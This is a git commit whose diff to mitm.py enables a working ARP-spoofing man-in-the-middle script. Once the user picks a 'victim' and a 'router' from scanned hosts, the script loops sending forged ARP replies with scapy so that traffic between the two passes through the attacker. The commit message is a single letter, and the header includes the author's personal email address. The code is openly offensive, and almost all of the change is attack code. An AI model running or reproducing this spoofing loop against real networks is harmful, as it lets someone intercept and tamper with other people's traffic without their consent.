9e023cff980df6c3b93eb70a5abaf641160517a1
m4ul <hansonlucas06@gmail.com>
2022-11-04 18:44:51 +0100

    l

--- mitm.py
+++ mitm.py
@@ -16,33 +16,30 @@ for sent, received in result:
 for i in range (len(ip)):
     print(ip[i], " = ", mac[i])
 
-#print("Chose a victim:")
-#victim = int(input())
-#print("Chose the router:")
-#router = int(input())
+print("Chose a victim:")
+victim = int(input())-1
+print("Chose the router:")
+router = int(input())-1
 
-#print ("Victim ip: ", ip[victim-1],"    Victim mac: ", mac[victim-1])
+print ("Victim ip: ", ip[victim],"    Victim mac: ", mac[victim])
 
-#print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])
+print ("Router ip: ", ip[router],"    Router mac: ", mac[router])
 
 #hwsrc:mac source
 #hwdst: mac dest
 #psrc:ip source
 #pdst:ip dest
 
-#try:
- #   while True:
-  #      torouter = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[victim-1]), pdst=(ip[router-1]),hwdst=(mac[router-1])), timeout=3, verbose=0)
-   #     tovictim = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[router-1]), pdst=(ip[victim-1]),hwdst=(mac[victim-1])), timeout=3, verbose=0)
-#except KeyboardInterrupt:
- #   pass
 try:
     while True:
-        ARP(op = 2, pdst = "10.5.1.2", psrc = "10.5.1.254", hwdst= "08:00:27:b1:49:ab" )
-        ARP(op = 2, pdst = "10.5.1.254", psrc = "10.5.1.2", hwdst= "08:00:27:b1:49:ab")
+        torouter = srp(ARP(op = 2,psrc=(ip[victim]), pdst=(ip[router]),hwdst=(mac[router])), verbose=True)
+        tovictim = srp(ARP(op = 2,psrc=(ip[router]), pdst=(ip[victim]),hwdst=(mac[victim])), verbose=True)
 except KeyboardInterrupt:
     pass
+
     
+    
+
 
 
 
